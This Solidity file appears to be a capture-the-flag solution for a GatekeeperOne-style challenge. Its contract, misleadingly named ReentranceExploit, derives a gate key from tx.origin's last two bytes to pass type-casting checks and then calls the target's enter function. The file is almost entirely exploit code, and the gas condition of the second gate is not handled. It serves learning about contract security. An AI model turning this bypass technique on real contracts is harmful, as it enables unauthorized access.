// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IGatekeeperOne{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract ReentranceExploit {
    address payable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function close() external {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function exploit(address _target) external payable {
        IGatekeeperOne target = IGatekeeperOne(_target);

        // Hardcoded to pass gate 3 parts 1 and 2
        bytes8 key = 0x1111111100000000;
        bytes memory keyArray = abi.encodePacked(key);

        // Extracts last 2 bytes of an address: 0x000...1234 --> 0x1234
        bytes2 lastTwo = bytes2(uint16(uint160(tx.origin)));
        bytes memory lastTwoArray = abi.encodePacked(lastTwo);
        // To pass gate 3 part 3
        keyArray[6] = lastTwoArray[0];
        keyArray[7] = lastTwoArray[1];

        bytes8 gateKey = bytes8(keyArray); // Example: 0x1111111100001234

        target.enter(gateKey);
    }

    function getThree() public view  returns (uint16){
        return uint16(uint160(msg.sender));
    }

    function getKey(bytes8 _gateKey) public pure  returns (uint32){
        return uint32(uint64(_gateKey));
    }

    function getAsU64(bytes8 _gateKey) public pure  returns (uint64){
        return uint64(_gateKey);
    }


}
